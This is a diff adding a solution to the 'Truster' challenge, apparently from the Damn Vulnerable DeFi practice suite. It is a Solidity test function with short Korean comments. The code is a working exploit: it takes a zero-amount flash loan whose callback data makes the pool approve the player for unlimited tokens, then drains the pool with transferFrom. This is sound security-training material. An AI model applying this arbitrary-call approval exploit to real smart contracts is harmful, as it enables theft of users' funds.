@@ -51,8 +51,13 @@ contract TrusterChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_truster() public checkSolvedByPlayer {
-        
+        bytes memory data = abi.encodeCall(token.approve, (address(player), type(uint256).max));
+        // 0개만 빌려서 flashloan 내부 잔액 검사 통과
+        pool.flashLoan(0, address(this), address(token), data);
+        // pool -> recovery로 토큰 전송
+        token.transferFrom(address(pool), recovery, TOKENS_IN_POOL);
     }
+
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
